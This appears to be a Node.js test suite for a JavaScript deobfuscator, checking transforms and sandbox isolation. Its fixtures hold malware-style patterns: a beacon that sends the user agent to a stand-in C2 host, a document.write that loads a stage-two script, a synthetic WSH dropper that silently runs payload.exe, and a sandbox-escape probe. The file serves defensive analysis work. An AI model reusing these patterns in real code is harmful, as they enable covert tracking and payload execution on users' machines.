import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import { deobfuscate } from '../src/index.js';
import { generate } from '../src/codegen.js';
import { parse } from '../src/ast.js';

const norm = (code) => generate(parse(code).ast);
const deob = (code, opts) => deobfuscate(code, opts).code;
const same = (input, expected, opts) => assert.equal(deob(input, opts), norm(expected));
const unchanged = (input, opts) => same(input, input, opts);

// ---------- static transforms ----------

test('constant folding', () => {
  same("x(!![], ![], 0x10 + 1, 'a' + 'b', void 0, typeof 'q', -(-1), `t${1 + 1}`);",
    "x(true, false, 17, 'ab', undefined, 'string', 1, 't2');");
});

test('computed members and keys', () => {
  same("a['b']['c'](); o = {'k': 1, ['m']: 2};", 'a.b.c(); o = {k: 1, m: 2};');
  unchanged("o = {['__proto__']: 1}; a['not-ident'];");
});

test('dead branches keep hoisted vars', () => {
  same('if (1 === 1) { a(); } else { b(); }', 'a();');
  same("if ('x' === 'y') { var v = 1; } v = 2; use(v);", 'var v; v = 2; use(v);');
  same('x = true ? a : b; y = false || c; z = 0 && d;', 'x = a; y = c; z = 0;');
});

test('sequence splitting', () => {
  same('function f() { return a(), b(), c; }', 'function f() { a(); b(); return c; }', { removeDeadCode: false });
  same('a(), b();', 'a(); b();');
});

test('constant inlining respects reassignment, hoisting and shadowing', () => {
  same("var s = 'x'; f(s);", "f('x');");
  unchanged("var s = 'x'; s = g(); f(s);");
  unchanged("f(s); var s = 'x';", { removeDeadCode: false });
  same("var s = 'x'; function g(s) { return s; } h(g, s);", "function g(s) { return s; } h(g, 'x');");
});

test('member access on constant arrays', () => {
  same("var a = ['log', 'hi']; console[a[0]](a[1]);", "console.log('hi');");
  same("x = 'abc'.length + ['p','q'][1];", "x = '3q';");
  unchanged("var a = ['x']; a.push('y'); f(a[0]);"); // mutated: keep
});

test('proxy variables are only inlined when the target resolves identically', () => {
  same('var b = a; b(1);', 'a(1);');
  unchanged('var b = a; function f(a) { return b(a); } g(f);');
});

test('proxy functions', () => {
  same('function w(x, y) { return dec(y - 1, x); } w(k, 5);', 'dec(4, k);');
  // evaluation order of two side-effecting args would change
  unchanged('function f(a, b) { return b + a; } g(f(x(), y()));');
  // recursion is never inlined
  unchanged('function r(n) { return r(n - 1); } g(r(3));');
});

test('proxy objects', () => {
  same("var o = {'aB': function (a, b) { return a + b; }, 'cD': 'log'}; console[o['cD']](o['aB'](q, 1));",
    'console.log(q + 1);');
  unchanged("var o = {aB: 'x'}; o.aB = 'y'; f(o.aB);"); // written: keep
});

test('control flow unflattening', () => {
  same("var o = '2|0|1'.split('|'), i = 0; while (!![]) { switch (o[i++]) { case '0': b(); continue; case '1': return c(); case '2': a(); continue; } break; }",
    'a(); b(); return c();');
  // a loose `break` inside a case would change meaning: leave it alone
  const loose = "var o = ['1','0'], i = 0; while (true) { switch (o[i++]) { case '0': if (x) break; b(); continue; case '1': a(); continue; } break; }";
  assert.match(deob(loose), /switch/);
});

test('eval and Function shells', () => {
  same("eval('a(1); b(2);');", 'a(1); b(2);');
  same("x = eval('1 + y');", 'x = 1 + y;');
  same("Function('g(1)')();", '(function () { g(1); })();');
  // the body would capture the local `g` if inlined
  const local = "function f(g) { Function('g(1)')(); } h(f);";
  assert.match(deob(local), /Function\(/);
});

// ---------- sandboxed transforms ----------

test('builtin calls on literals', () => {
  same("x = 'dlrow'.split('').reverse().join('') + String.fromCharCode(33) + atob('aGk=') + parseInt('0x1f');",
    "x = 'world!hi31';");
  unchanged("x = 'abc'.split('');", { unsafe: false });
});

test('decoder calls: deterministic, side-effect free only', () => {
  same("function d(i) { return ['a', 'b', 'c'][i - 10]; } x = d(11) + d(12);", "x = 'bc';");
  // writes global state -> not a decoder
  const se = 'var n = 0; function f(k) { n++; return k; } x = f(1);';
  assert.match(deob(se), /f\(1\)/);
  // non-deterministic
  assert.match(deob('function r(k) { var t = Math.random(); return t * k; } x = r(1);'), /r\(1\)/);
  // safe mode never evaluates
  assert.match(deob("function d(i) { var t = ['a']; return t[i]; } x = d(0);", { unsafe: false }), /d\(0\)/);
});

test('sandbox has no host access', () => {
  const code = "function p(k) { var P = this.constructor.constructor('return process')(); return typeof P + k; } x = p(1);" +
    "function q(k) { var t = typeof require + typeof process; return t + k; } y = q('!');";
  const out = deob(code);
  assert.match(out, /x = p\(1\)/); // ReferenceError inside the sandbox -> left alone
  assert.match(out, /y = 'undefinedundefined!'/);
});

// ---------- end to end ----------

function behaviour(code) {
  const log = [];
  const ctx = {
    navigator: { userAgent: 'UA', language: 'fr' },
    localStorage: { getItem: (k) => (log.push(['getItem', k]), null), setItem: (k, v) => log.push(['setItem', k, typeof v]) },
    JSON, Math, decodeURIComponent, parseInt, String,
    console: { log: (...a) => log.push(['log', ...a]) },
    fetch: (u, o) => {
      log.push(['fetch', u, o.method, o.body.replace(/"id":"[^"]+"/, '"id":X')]);
      return { then(f) { f({ status: 200 }); return { catch() {} }; } };
    },
  };
  vm.createContext(ctx);
  vm.runInContext(code, ctx);
  return log;
}

test('obfuscator.io-style sample: fully recovered, same behaviour', () => {
  const src = fs.readFileSync(new URL('../samples/obfuscated.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.deepEqual(behaviour(out), behaviour(src));
  assert.doesNotMatch(out, /_0x4f1e|_0x3b2a|_0x2a91|_0x19c7|switch/);
  assert.match(out, /fetch\('https:\/\/c2\.example\.invalid\/beacon'/);
  assert.match(out, /localStorage\.setItem\('uid'/);
});

test('Dean Edwards packer: eval(function(p,a,c,k,e,d){...}) is unpacked', () => {
  const src = fs.readFileSync(new URL('../samples/packed.js', import.meta.url), 'utf8');
  const out = deob(src);
  assert.doesNotMatch(out, /eval|function \(p, a, c, k/);
  assert.match(out, /document\.write\('<script src="https:\/\/cdn\.example\.invalid\/stage2\.js"><\/script>'\)/);
  assert.match(out, /beacon\.src = 'https:\/\/c2\.example\.invalid\/p\?u=' \+ encodeURIComponent\(navigator\.userAgent\)/);
});

test('WSH junk-char dropper pattern (synthetic)', () => {
  const src = `
    var s = "♉W♉S♉c♉r♉i♉p♉t♉.♉S♉h♉e♉l♉l"; var n = s.split("♉").join(""); var sh = new ActiveXObject(n);
    var d = sh.SpecialFolders("MyDocuments");
    var J = 'x'; function cIXf(a) { J += 'noise'; } var J = 'y'; function cIXf(b) { J += 'more'; }
    var g = {}; var k = 'K'; g[k] = { a: ['junk'] };
    function rev(t) { var a = t.split(""); var b = a.reverse(); return b.join(""); }
    var p = d + "\\\\" + rev("♉♉♉exe.daolyap♉♉♉");
    var q = 'aGVs?bG8!'; var q1 = q.split('?').join(''); var q2 = q1.split('!').join(''); el.text = q2;
    var q = 'd29y?bGQ='; var q1 = q.split('?').join(''); var q2 = q1.split('!').join(''); el2.text = q2;
    sh.Run(p.split("♉♉♉").join(""), 0, false);`;
  same(src, `
    var sh = new ActiveXObject('WScript.Shell');
    var d = sh.SpecialFolders('MyDocuments');
    var p = d + '\\\\payload.exe';
    el.text = 'aGVsbG8';
    el2.text = 'd29ybGQ=';
    sh.Run(p, 0, false);`);
});

test('redeclarations are only split when straight-line', () => {
  same("function f() { var s = 'a'; use(s); var s = 'b'; use(s); } g(f);", "function f() { use('a'); use('b'); } g(f);");
  unchanged("function f() { var s = 'a'; g(function () { return s; }); var s = 'b'; use(s); } h(f);");
});

test('dead code: re-declared junk and its writes are removed together', () => {
  same("var J = 'x'; function n(a) { J += 'a'; } var J = 'y'; function n(b) { J += 'b'; } go();", 'go();');
  unchanged("var J = 'x'; J += 'a'; use(J);");
});
